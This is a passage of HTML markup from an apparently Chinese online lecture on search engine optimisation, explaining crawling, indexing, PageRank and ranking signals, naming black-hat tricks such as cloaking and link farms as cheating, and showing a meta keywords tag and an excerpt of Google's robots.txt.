data-first-offset="true"><span class="se-b293ccbf" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">1. 爬取（Crawling）</span></span></span></span> </div> <div class="se-018f928b 
" data-slate-type="paragraph" data-slate-object="block" data-key="1283"> <span data-slate-object="text" 
data-key="1284"><span data-slate-leaf="true" data-offset-key="1284:0" data-first-offset="true"><span 
data-slate-string="true">搜索引擎会有若干个“爬虫”客户端定期地访问你的网站，如果数据有了变更，它们会将可访问的网页下载下来。搜索引擎发现网页的方式，和人是一样的，就是通过超链接。因此理论上，如果你建立了一个网站，但是你没有主动“告知”搜索引擎，也没有任何网站页面有超链接指向它，那么它是无法被搜索引擎的爬虫发现的。</span></span></span> 
</div> <div class="se-88166f6c " data-slate-type="paragraph" data-slate-object="block" data-key="1285"> 
<span data-slate-object="text" data-key="1286"><span data-slate-leaf="true" data-offset-key="1286:0" 
data-first-offset="true"><span class="se-be413e30" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">2. 建立索引（Indexing）</span></span></span></span> </div> <div class="se-14d1d3be 
" data-slate-type="paragraph" data-slate-object="block" data-key="1287"> <span data-slate-object="text" 
data-key="1288"><span data-slate-leaf="true" data-offset-key="1288:0" data-first-offset="true"><span 
data-slate-string="true">这一步其实就是将前面爬取的结果，经过解析和处理以后，以一种有利于搜索的方式归类存放起来。在 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1289" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1290"><span data-slate-leaf="true" data-offset-key="1290:0" 
data-first-offset="true"><span data-slate-string="true">[第 26 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1291"><span data-slate-leaf="true" data-offset-key="1291:0" 
data-first-offset="true"><span data-slate-string="true"> 我们介绍了搜索引擎的倒排索引机制。</span></span></span> 
</div> <div class="se-aa2f6bd6 " data-slate-type="paragraph" data-slate-object="block" data-key="1292"> 
<span data-slate-object="text" data-key="1293"><span data-slate-leaf="true" data-offset-key="1293:0" 
data-first-offset="true"><span class="se-2c4cde6f" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">3. 返回结果（Serving Results）</span></span></span></span> </div> <div class="se-d01f282a 
" data-slate-type="paragraph" data-slate-object="block" data-key="1294"> <span data-slate-object="text" 
data-key="1295"><span data-slate-leaf="true" data-offset-key="1295:0" data-first-offset="true"><span 
data-slate-string="true">拆解用户的搜索条件，根据多种因素来决定返回哪些网页或其它资源给用户，也包括确定它们的展示顺序（Ranking）。</span></span></span> 
</div> <div class="se-a4611dd2 " data-slate-type="paragraph" data-slate-object="block" data-key="1296"> 
<span data-slate-object="text" data-key="1297"><span data-slate-leaf="true" data-offset-key="1297:0" 
data-first-offset="true"><span data-slate-string="true">这三个大致的步骤协同合作并提供了如今互联网搜索引擎的服务，当然，实际过程会复杂得多。比方说，上述的第 
2 步就要包含解析、分词、去重、去噪等等许多步的操作。</span></span></span> </div> <div class="se-b0009bdd " data-slate-type="paragraph" 
data-slate-object="block" data-key="1298"> <span data-slate-object="text" data-key="1299"><span 
data-slate-leaf="true" data-offset-key="1299:0" data-first-offset="true"><span data-slate-string="true">另外值得一提的是，搜索的数据现在确实都是增量更新的，可早些年其实并不是如此。Google 
在 2003 年以前，爬虫完成不同的数据爬行需要不同的时间，其中最慢的需要几个月，之后的索引需要一周，数据分发也需要一周，在这以后才能被搜索到，因此人们往往也只能搜索到很早以前的数据（当然，那时候互联网的数据没那么大，变更也没那么频繁）。在一次重要更新 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1300" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="1301"><span data-slate-leaf="true" data-offset-key="1301:0" 
data-first-offset="true"><span data-slate-string="true">Fritz</span></span></span></a><span 
data-slate-object="text" data-key="1302"><span data-slate-leaf="true" data-offset-key="1302:0" 
data-first-offset="true"><span data-slate-string="true"> 以后，爬虫才每天都爬网页的数据，搜索数据也才做到了日更新。</span></span></span> 
</div> <h3 class="se-2db10db7" data-slate-type="heading" data-slate-object="block" data-key="1303"><span 
data-slate-object="text" data-key="1304"><span data-slate-leaf="true" data-offset-key="1304:0" 
data-first-offset="true"><span data-slate-string="true">PageRank</span></span></span></h3> 
<div class="se-a8cd52f7 " data-slate-type="paragraph" data-slate-object="block" data-key="1305"> 
<span data-slate-object="text" data-key="1306"><span data-slate-leaf="true" data-offset-key="1306:0" 
data-first-offset="true"><span data-slate-string="true">纵观上面所述的三个步骤，从功能实现的流程和工程上面说，它们各自看起来并没有太大的技术门槛，但是搜索质量却天差地别。其中重要的一项就是怎样对返回给用户的网页进行排名，对于 
Google 搜索，这一系列算法中最核心的那个，就叫做 PageRank。</span></span></span> </div> <div class="se-91180e23 " 
data-slate-type="paragraph" data-slate-object="block" data-key="1307"> <span data-slate-object="text" 
data-key="1308"><span data-slate-leaf="true" data-offset-key="1308:0" data-first-offset="true"><span 
data-slate-string="true">在 PageRank 以前，排序大多依靠对搜索关键字和目标页的匹配度来进行，这种排序方式弊端非常明显，尤其对于善于堆砌关键字“舞弊”的页面，很容易就跳到了搜索结果的首页。但是这样的页面对于用户来说，价值非常小。</span></span></span> 
</div> <div class="se-4d58b878 " data-slate-type="paragraph" data-slate-object="block" data-key="1309"> 
<span data-slate-object="text" data-key="1310"><span data-slate-leaf="true" data-offset-key="1310:0" 
data-first-offset="true"><span data-slate-string="true">PageRank 算法的本质，就是利用网页之间的关联关系来确定网页的影响力权重。而这个关联关系，就是网页之间的超链接，换言之，如果一个页面被各种其它页面引用，特别是被“重要”的网站和页面引用，这就说明这个页面的权重更高。</span></span></span> 
</div> <div class="se-e75b71be " data-slate-type="paragraph" data-slate-object="block" data-key="1311"> 
<span data-slate-object="text" data-key="1312"><span data-slate-leaf="true" data-offset-key="1312:0" 
data-first-offset="true"><span data-slate-string="true">在实际搜索的时候，</span></span></span><span 
data-slate-object="text" data-key="1313"><span data-slate-leaf="true" data-offset-key="1313:0" 
data-first-offset="true"><span class="se-1ff4f4b5" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">需要做到两个因素的平衡：一个是 Reputation，也就是上面说的这个影响力，它并不会因为用户单次搜索的关键字不同而改变；还有一个是 
Proximity，也就是接近程度，这是根据用户搜索的关键字的匹配程度来确定返回网页的。</span></span></span></span> </div> <div class="se-598a5f11 
" data-slate-type="paragraph" data-slate-object="block" data-key="1314"> <span data-slate-object="text" 
data-key="1315"><span data-slate-leaf="true" data-offset-key="1315:0" data-first-offset="true"><span 
data-slate-string="true">如果只考虑 Reputation，那么所有用户搜到的东西都是一样的，这就不是一个搜索引擎了，而是一个网页的有序列表；如果只考虑 Proximity，那么用户搜到的东西就是杂乱无章的匹配页面，而不是像现在这样，将“重要”的页面显示在前面。无论是百度还是 
Bing，</span></span></span><span data-slate-object="text" data-key="1316"><span data-slate-leaf="true" 
data-offset-key="1316:0" data-first-offset="true"><span class="se-214f7906" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">不同搜索服务的算法不同，但都是立足于做到这两个基本因素的制衡。</span></span></span></span> 
</div> <h2 class="se-fc869c14" data-slate-type="heading" data-slate-object="block" data-key="1317"><span 
data-slate-object="text" data-key="1318"><span data-slate-leaf="true" data-offset-key="1318:0" 
data-first-offset="true"><span data-slate-string="true">SEO 相关技术</span></span></span></h2> 
<div class="se-1c6b6b9e " data-slate-type="paragraph" data-slate-object="block" data-key="1319"> 
<span data-slate-object="text" data-key="1320"><span data-slate-leaf="true" data-offset-key="1320:0" 
data-first-offset="true"><span data-slate-string="true">下面我们再来从工程实现的角度一窥 SEO 技术。技术是要为业务目的服务的，我们最大的目的，是为了让网站的内容更真实、更合理地暴露在搜索引擎的搜索结果中。</span></span></span> 
</div> <h3 class="se-0b4b9d2f" data-slate-type="heading" data-slate-object="block" data-key="1321"><span 
data-slate-object="text" data-key="1322"><span data-slate-leaf="true" data-offset-key="1322:0" 
data-first-offset="true"><span data-slate-string="true">1. 白帽和黑帽</span></span></span></h3> 
<div class="se-f810dd15 " data-slate-type="paragraph" data-slate-object="block" data-key="1323"> 
<span data-slate-object="text" data-key="1324"><span data-slate-leaf="true" data-offset-key="1324:0" 
data-first-offset="true"><span data-slate-string="true">当我们明确了上述的目的，遵循搜索引擎规则，通过正当和高效的技术途径来实现 
SEO 的效果，这样的方法叫做</span></span></span><span data-slate-object="text" data-key="1325"><span data-slate-leaf="true" 
data-offset-key="1325:0" data-first-offset="true"><span class="se-74375a5f" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">白帽（White Hat）法</span></span></span></span><span 
data-slate-object="text" data-key="1326"><span data-slate-leaf="true" data-offset-key="1326:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span><span data-slate-object="text" 
data-key="1327"><span data-slate-leaf="true" data-offset-key="1327:0" data-first-offset="true"><span 
class="se-250846e4" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">相应的，如果是通过作弊、欺骗这样的手段，就叫做黑帽（Black 
Hat）法</span></span></span></span><span data-slate-object="text" data-key="1328"><span data-slate-leaf="true" 
data-offset-key="1328:0" data-first-offset="true"><span data-slate-string="true">。如果你了解过网络安全中的白帽和黑帽，那么这里的含义其实是一致的。</span></span></span> 
</div> <div class="se-f5ccab10 " data-slate-type="paragraph" data-slate-object="block" data-key="1329"> 
<span data-slate-object="text" data-key="1330"><span data-slate-leaf="true" data-offset-key="1330:0" 
data-first-offset="true"><span data-slate-string="true">搜索引擎在评估网站前文所述的影响力的时候，有许许多多不同的“</span></span></span><span 
data-slate-object="text" data-key="1331"><span data-slate-leaf="true" data-offset-key="1331:0" 
data-first-offset="true"><span class="se-10ab2194" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">Ranking Signal</span></span></span></span><span data-slate-object="text" 
data-key="1332"><span data-slate-leaf="true" data-offset-key="1332:0" data-first-offset="true"><span 
data-slate-string="true">”，它指的就是会影响返回的网页排序的“信号”，它们共同决定了一个页面的影响力，对于 Google 搜索来说 ，</span></span></span><span 
data-slate-object="text" data-key="1333"><span data-slate-leaf="true" data-offset-key="1333:0" 
data-first-offset="true"><span class="se-30f99f1e" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">前面我们提到的 PageRank，只是其中之一</span></span></span></span><span data-slate-object="text" 
data-key="1334"><span data-slate-leaf="true" data-offset-key="1334:0" data-first-offset="true"><span 
data-slate-string="true">。这里面大多数的信号，都可以应用相应的 SEO 规则来进行优化，我随便举几个例子：</span></span></span> </div> 
<div class="se-d0f9ef51" data-slate-type="list" data-slate-object="block" data-key="1335"> 
<div class="se-8b5a8865 se-b02a7c52" data-slate-type="list-line" data-slate-object="block" 
data-key="1336"> <span data-slate-object="text" data-key="1337"><span data-slate-leaf="true" 
data-offset-key="1337:0" data-first-offset="true"><span data-slate-string="true">网站的正常运行时间。比方说，如果一个站点，在爬虫爬取的时候总是遭遇 
4xx、5xx 这样的错误，显然对影响力是一个负面的加权。</span></span></span> </div> <div class="se-05d61610 se-793124ce" 
data-slate-type="list-line" data-slate-object="block" data-key="1338"> <span data-slate-object="text" 
data-key="1339"><span data-slate-leaf="true" data-offset-key="1339:0" data-first-offset="true"><span 
data-slate-string="true">网站的年龄，网页内容的新鲜程度，好的原创内容总是最好的优化方式。</span></span></span> </div> <div 
class="se-9feb2a18 se-1cbfb0b4" data-slate-type="list-line" data-slate-object="block" data-key="1340"> 
<span data-slate-object="text" data-key="1341"><span data-slate-leaf="true" data-offset-key="1341:0" 
data-first-offset="true"><span data-slate-string="true">网站采用 HTTPS 还是 HTTP，显然 HTTPS 要更优。</span></span></span> 
</div> <div class="se-531e8122 se-e027c3ac" data-slate-type="list-line" data-slate-object="block" 
data-key="1342"> <span data-slate-object="text" data-key="1343"><span data-slate-leaf="true" 
data-offset-key="1343:0" data-first-offset="true"><span data-slate-string="true">HTML 代码的质量，是否存在错误。</span></span></span> 
</div> <div class="se-723ace4c se-cf86d936" data-slate-type="list-line" data-slate-object="block" 
data-key="1344"> <span data-slate-object="text" data-key="1345"><span data-slate-leaf="true" 
data-offset-key="1345:0" data-first-offset="true"><span data-slate-string="true">网页在站点访问的深度。</span></span></span> 
</div> </div> <div class="se-2a0c5031 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1346"> <span data-slate-object="text" data-key="1347"><span data-slate-leaf="true" 
data-offset-key="1347:0" data-first-offset="true"><span data-slate-string="true">当然，黑帽法我们也来简单了解几个。</span></span></span> 
</div> <div class="se-097c5b71 " data-slate-type="paragraph" data-slate-object="block" data-key="1348"> 
<span data-slate-object="text" data-key="1349"><span data-slate-leaf="true" data-offset-key="1349:0" 
data-first-offset="true"><span class="se-ea782142" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">关键字堆砌</span></span></span></span><span data-slate-object="text" data-key="1350"><span 
data-slate-leaf="true" data-offset-key="1350:0" data-first-offset="true"><span data-slate-string="true">：说白了就是放置大量的甚至和网页内容无关的关键字，比方说在页面上放置一些无关的关键字，并将它们的样式设置为透明，这样用户看不见，但是搜索引擎就以为这个页面和这些额外的关键字有关，在一些本该无关的搜索中会增加曝光度。</span></span></span><span 
data-slate-object="text" data-key="1351"><span data-slate-leaf="true" data-offset-key="1351:0" 
data-first-offset="true"><span class="se-165f82ea" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">这其实就是给搜索引擎和用户看不同的页面</span></span></span></span><span data-slate-object="text" 
data-key="1352"><span data-slate-leaf="true" data-offset-key="1352:0" data-first-offset="true"><span 
data-slate-string="true">，搜索引擎看的页面堆砌了大量的无关关键字，而用户看到的才是正常的网页，这种方法被称为 Cloaking。</span></span></span> 
</div> <div class="se-9d55b83f " data-slate-type="paragraph" data-slate-object="block" data-key="1353"> 
<span data-slate-object="text" data-key="1354"><span data-slate-leaf="true" data-offset-key="1354:0" 
data-first-offset="true"><span data-slate-string="true">还有一种方法叫做 Doorway Pages，这种技术则是创建一个堆砌关键字的临时页面，用户访问的时候，则自动转向正常的网页，或是主页。你可以看到这些黑帽技术，都是为了糊弄搜索引擎而添加了某些本不该出现在页面里的关键字。</span></span></span> 
</div> <div class="se-0dfdb1e3 " data-slate-type="paragraph" data-slate-object="block" data-key="1355"> 
<span data-slate-object="text" data-key="1356"><span data-slate-leaf="true" data-offset-key="1356:0" 
data-first-offset="true"><span class="se-16f59e76" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">链接农场</span></span></span></span><span data-slate-object="text" data-key="1357"><span 
data-slate-leaf="true" data-offset-key="1357:0" data-first-offset="true"><span data-slate-string="true">（Link 
Farm）：将网站链接放到很多本不该进行外链的其它网站页面上，比如花钱买一些不相关的内容，强行建立外链。不知道你有没有听说过“</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1358" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="1359"><span data-slate-leaf="true" data-offset-key="1359:0" data-first-offset="true"><span 
data-slate-string="true">Google 轰炸</span></span></span></a><span data-slate-object="text" data-key="1360"><span 
data-slate-leaf="true" data-offset-key="1360:0" data-first-offset="true"><span data-slate-string="true">”，它本质上就属于这种方法。当年人们搜索“more 
evil than Satan”（比撒但还邪恶）的时候，结果的第一条居然出现了微软的主页。</span></span></span> </div> <div class="se-6ccb874d 
" data-slate-type="paragraph" data-slate-object="block" data-key="1361"> <span data-slate-object="text" 
data-key="1362"><span data-slate-leaf="true" data-offset-key="1362:0" data-first-offset="true"><span 
class="se-97965da3" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">Article 
Spinning</span></span></span></span><span data-slate-object="text" data-key="1363"><span data-slate-leaf="true" 
data-offset-key="1363:0" data-first-offset="true"><span data-slate-string="true">：这种技术将一些其它网站已有的内容拷贝过来，做一些用来欺骗搜索引擎的修改，让搜索引擎以为是一份新的内容。比如，替换一些特定的词语、句子，添加一些毫无意义的用户不可见的内容，等等。</span></span></span> 
</div> <h3 class="se-b34337fb" data-slate-type="heading" data-slate-object="block" data-key="1364"><span 
data-slate-object="text" data-key="1365"><span data-slate-leaf="true" data-offset-key="1365:0" 
data-first-offset="true"><span data-slate-string="true">2. 站内优化和站外优化</span></span></span></h3> 
<div class="se-e35fbb83 " data-slate-type="paragraph" data-slate-object="block" data-key="1366"> 
<span data-slate-object="text" data-key="1367"><span data-slate-leaf="true" data-offset-key="1367:0" 
data-first-offset="true"><span data-slate-string="true">SEO 的优化方式，可以大致分为站内的和站外的。站内优化，其实指的就是在自己管理的网站内部做优化工作来实现 
SEO。比如我们之前反复提到的关键字，现在，我们不妨动手来体会一下。</span></span></span> </div> <div class="se-2f52a7da " data-slate-type="paragraph" 
data-slate-object="block" data-key="1368"> <span data-slate-object="text" data-key="1369"><span 
data-slate-leaf="true" data-offset-key="1369:0" data-first-offset="true"><span data-slate-string="true">在浏览器地址栏中输入 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1370" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="1371"><span data-slate-leaf="true" data-offset-key="1371:0" 
data-first-offset="true"><span data-slate-string="true">https://time.geekbang.org</span></span></span></a><span 
data-slate-object="text" data-key="1372"><span data-slate-leaf="true" data-offset-key="1372:0" 
data-first-offset="true"><span data-slate-string="true">，打开极客时间的页面，右键点击页面空白处并查看网页源代码，你会看到这样的 
meta 标签：</span></span></span> </div> <div class="se-c64beaeb se-0c689716" data-slate-type="pre" 
data-slate-object="block" data-key="1373" data-code-language="objectivec"> <div class="se-c41b82b1 
se-2b8132a8"> <span></span> </div> <div class="se-6e2ac98c"> <div class="se-f1c63465 se-30b8bf6b" 
data-code-line-number="1"></div> </div> <div class="se-a343a4ef ps ps--active-x"> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="1374"> <span data-slate-object="text" 
data-key="1375"><span data-slate-leaf="true" data-offset-key="1375:0" data-first-offset="true"><span 
data-slate-string="true">&lt;meta name=keywords content= 极客时间,IT, 职业教育, 知识付费, 二叉树, 极客 Live, 
极客搜索, 互联网, 前端开发, 后端开发, 编程语言, 人工智能, 区块链, 技术大会, 技术管理, 产品, 研发, 测试, 运维, 数据库, 架构, 微服务, 实战, 技术专家,Java,iOS,Android,Linux,Go 
</span></span><span data-slate-leaf="true" data-offset-key="1375:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1670978211" data-annotation-type="annotation"><span 
data-slate-string="true">id</span></span></span><span data-slate-leaf="true" data-offset-key="1375:2"><span 
data-slate-string="true">=metakeywords&gt;</span></span></span> </div> <div class="ps__rail-x" 
style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 
0px; width: 69px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div 
class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> 
<div class="se-31832bf6 " data-slate-type="paragraph" data-slate-object="block" data-key="1376"> 
<span data-slate-object="text" data-key="1377"><span data-slate-leaf="true" data-offset-key="1377:0" 
data-first-offset="true"><span data-slate-string="true">这就是极客时间网站的关键词，这些关键词会让搜索引擎用户在搜索的时候准确地找到这个网站。除了 
keywords 的 meta 标签，还有一些其它起到帮助搜索引擎更准确地认识网站的 HTML 标签，比如 description 的 meta 标签，title 标签等等。对于 HTML 
的正文，你也许还记得我们在 </span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1378" 
class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" data-key="1379"><span data-slate-leaf="true" 
data-offset-key="1379:0" data-first-offset="true"><span data-slate-string="true">[第 17 讲]</span></span></span></a><span 
data-slate-object="text" data-key="1380"><span data-slate-leaf="true" data-offset-key="1380:0" 
data-first-offset="true"><span data-slate-string="true"> 介绍的 HTML 语义化标签，它们都可以帮助搜索引擎更好地理解内容。</span></span></span> 
</div> <div class="se-6aad83a1 " data-slate-type="paragraph" data-slate-object="block" data-key="1381"> 
<span data-slate-object="text" data-key="1382"><span data-slate-leaf="true" data-offset-key="1382:0" 
data-first-offset="true"><span data-slate-string="true">正如其名，站外优化则和站内优化相反，优化工作是在目标站之外开展的，比如众所周知的“友情链接”，就是一种提供外链的站外优化方式。</span></span></span> 
</div> <h3 class="se-49e6c40b" data-slate-type="heading" data-slate-object="block" data-key="1383"><span 
data-slate-object="text" data-key="1384"><span data-slate-leaf="true" data-offset-key="1384:0" 
data-first-offset="true"><span data-slate-string="true">3. roberts.txt</span></span></span></h3> 
<div class="se-a3cce112 " data-slate-type="paragraph" data-slate-object="block" data-key="1385"> 
<span data-slate-object="text" data-key="1386"><span data-slate-leaf="true" data-offset-key="1386:0" 
data-first-offset="true"><span data-slate-string="true">“roberts.txt”是网站根目录下直接能够访问到的文本文件，它是一个对于网络爬虫的规约，告诉它这个网站下哪些内容你是可以爬取的，哪些内容你是不能爬的。值得注意的是，</span></span></span><span 
data-slate-object="text" data-key="1387"><span data-slate-leaf="true" data-offset-key="1387:0" 
data-first-offset="true"><span class="se-6e360e76" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">roberts.txt 不是标准，也不是规范，而是一种“约定俗成”</span></span></span></span><span 
data-slate-object="text" data-key="1388"><span data-slate-leaf="true" data-offset-key="1388:0" 
data-first-offset="true"><span data-slate-string="true">，几乎所有的搜索引擎都会遵守它。</span></span></span> 
</div> <div class="se-3c429ebf " data-slate-type="paragraph" data-slate-object="block" data-key="1389"> 
<span data-slate-object="text" data-key="1390"><span data-slate-leaf="true" data-offset-key="1390:0" 
data-first-offset="true"><span data-slate-string="true">这就好像你在你家门口贴了张条，哪些过路人可以敲你家的门，而哪些人不可以，那么路过的人大多会按这张纸条上的要求去做，但如果你不受欢迎而硬要去敲门（访问），那么也没有任何人可以阻止你，但至于主人开不开门（是否响应请求），或者给不给好脸色（是否返回正常结果），就是另一回事了。</span></span></span> 
</div> <div class="se-4d55a207 " data-slate-type="paragraph" data-slate-object="block" data-key="1391"> 
<span data-slate-object="text" data-key="1392"><span data-slate-leaf="true" data-offset-key="1392:0" 
data-first-offset="true"><span data-slate-string="true">现在，你可以打开浏览器，在浏览器中输入 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1393" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1394"><span data-slate-leaf="true" data-offset-key="1394:0" 
data-first-offset="true"><span data-slate-string="true">https://www.google.com/robots.txt</span></span></span></a><span 
data-slate-object="text" data-key="1395"><span data-slate-leaf="true" data-offset-key="1395:0" 
data-first-offset="true"><span data-slate-string="true"> 来访问 Google 的 roberts.txt 文件。你将看到如下信息：</span></span></span> 
</div> <div class="se-8c2c8d0e se-67c5fb40" data-slate-type="pre" data-slate-object="block" 
data-key="1396" data-code-language="cpp"> <div class="se-684a5791 se-148eac2c"> <span></span> 
</div> <div class="se-f3aba6f5"> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="1"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="2"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="3"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="4"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="5"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="6"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="7"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="8"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="9"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="10"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="11"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="12"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="13"></div> 
<div class="se-9bed2252 se-74fbcdc4" data-code-line-number="14"></div> <div class="se-9bed2252 
se-74fbcdc4" data-code-line-number="15"></div> <div class="se-9bed2252 se-74fbcdc4" data-code-line-number="16"></div> 
</div> <div class="se-f4279ddf ps"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1397"> <span data-slate-object="text" data-key="1398"><span 
data-slate-leaf="true" data-offset-key="1398:0" data-first-offset="true"><span data-slate-string="true">User-agent: 
*</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1399"> <span data-slate-object="text" data-key="1400"><span 
data-slate-leaf="true" data-offset-key="1400:0" data-first-offset="true"><span data-slate-string="true">Disallow: 
/search</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1401"> <span data-slate-object="text" data-key="1402"><span 
data-slate-leaf="true" data-offset-key="1402:0" data-first-offset="true"><span data-slate-string="true">Allow: 
/search/about</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1403"> <span data-slate-object="text" data-key="1404"><span 
data-slate-leaf="true" data-offset-key="1404:0" data-first-offset="true"><span data-slate-string="true">Allow: 
/search/</span></span><span data-slate-leaf="true" data-offset-key="1404:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_0530391694" data-annotation-type="annotation"><span 
data-slate-string="true">static</span></span></span></span> </div> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="1405"> <span data-slate-object="text" 
data-key="1406"><span data-slate-leaf="true" data-offset-key="1406:0" data-first-offset="true"><span 
data-slate-string="true">...</span></span></span> </div> <div class="se-0efb589d se-39cfb103" 
data-slate-type="code-line" data-slate-object="block" data-key="1407"> <span data-slate-object="text" 
data-key="1408"><span data-slate-leaf="true" data-offset-key="1408:0" data-first-offset="true"><span 
data-slate-string="true">Disallow: /imgres</span></span></span> </div> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="1409"> <span data-slate-object="text" 
data-key="1410"><span data-slate-leaf="true" data-offset-key="1410:0" data-first-offset="true"><span 
data-slate-string="true">...</span></span></span> </div> <div class="se-0efb589d se-39cfb103" 
data-slate-type="code-line" data-slate-object="block" data-key="1411"> <span data-slate-object="text" 
data-key="1412"><span data-slate-leaf="true" data-offset-key="1412:0" data-first-offset="true"><span 
data-slate-string="true">（省略大量 Disallow 和 Allow 的配置）</span></span></span> </div> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="1413"> <span data-slate-object="text" 
data-key="1414"></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1415"> <span data-slate-object="text" data-key="1416"><span 
data-slate-leaf="true" data-offset-key="1416:0" data-first-offset="true"><span data-slate-string="true">User-agent: 
Twitterbot</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1417"> <span data-slate-object="text" data-key="1418"><span 
data-slate-leaf="true" data-offset-key="1418:0" data-first-offset="true"><span data-slate-string="true">Allow: 
/imgres</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1419"> <span data-slate-object="text" data-key="1420"></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1421"> <span data-slate-object="text" data-key="1422"><span data-slate-leaf="true" 
data-offset-key="1422:0" data-first-offset="true"><span data-slate-string="true">User-agent: 
facebookexternalhit</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1423"> <span data-slate-object="text" data-key="1424"><span 
data-slate-leaf="true" data-offset-key="1424:0" data-first-offset="true"><span data-slate-string="true">Allow: 
/imgres</span></span></span> </div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="1425"> <span data-slate-object="text" data-key="1426"></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="1427"> <span data-slate-object="text" data-key="1428"><span data-slate-leaf="true" 
data-offset-key="1428:0" data-first-offset="true"><span data-slate-string="true">Sitemap: https:</span></span><span 
data-slate-leaf="true" data-offset-key="1428:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_2237066590" data-annotation-type="annotation"><span data-slate-string="true">//www.google.com/sitemap.xml</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-51957b0a " data-slate-type="paragraph" data-slate-object="block" data-key="1429"> 
<span data-slate-object="text" data-key="1430"><span data-slate-leaf="true" data-offset-key="1430:0" 
data-first-offset="true"><span data-slate-string="true">这是说，对于默认的爬虫（User-agent 为 *），/search 
和 /imgres 是不允许爬取的，但是 /search/about 和 /search/static 是可以爬取的，请注意 Allow 指令比 Disallow 有更高的优先级；对于 
Twitter 和 Facebook 的爬虫，却是允许访问 /imgres 的。</span></span></span> </div> <div class="se-9c029a88 
" data-slate-type="paragraph" data-slate-object="block" data-key="1431"> <span data-slate-object="text" 
data-key="1432"><span data-slate-leaf="true" data-offset-key="1432:0" data-first-offset="true"><span 
data-slate-string="true">你可以看到，这样的配置是运行配置默认值，然后通过特殊值来覆写的（不知这能否让你回想起 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1433" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="1434"><span data-slate-leaf="true" data-offset-key="1434:0" 
